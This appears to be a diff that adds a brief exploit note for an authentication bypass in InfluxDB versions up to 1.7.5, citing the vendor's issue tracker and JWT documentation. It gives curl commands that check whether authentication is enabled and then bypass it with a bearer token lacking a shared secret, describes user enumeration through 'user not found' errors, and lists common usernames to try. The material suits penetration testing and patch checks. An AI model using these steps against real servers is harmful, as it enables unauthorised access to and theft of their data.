@@ -1,0 +1,42 @@
+------------------------------------------------------------------
+InfluxDB <= v1.7.5 Password bypass vulnerability
+https://github.com/influxdata/influxdb/issues/12927
+
+InfluxDB Documentation - Authenticate using jwt tokens
+------------------------------------------------------------------
+https://docs.influxdata.com/influxdb/v1.7/administration/authentication_and_authorization/#authenticate-using-jwt-tokens
+
+
+* No idea why this didn't get a CVE
+
+
+Trivial to exploit:
+------------------------------------------------------------------
+
+	* Check for Authentication:
+
+		curl http://<host>:<port>/query --data-urlencode 'q=SHOW DATABASES'
+		{"error":"unable to parse authentication credentials"}
+
+		curl http://<host>:<port>/query -u 'someuser:somepasswd' --data-urlencode 'q=SHOW DATABASES'
+		{"error":"authorization failed"}
+
+	* Bypass Auth, Issue request with jwt token (no shared secret)
+
+		curl -s http://<host>:<port>/query --data-urlencode 'q=SHOW DATABASES' --header 'Authorization: Bearer <token>'
+
+	* Enumerate users with no shared secret in jwt (user not found returned):
+
+		{"error":"user not found"}
+
+Quick hit usernames:
+-----------------------
+admin
+test
+telegraf
+telegraf_ro
+telegraf_rw
+grafana
+grafana_ro
+grafana_rw
+
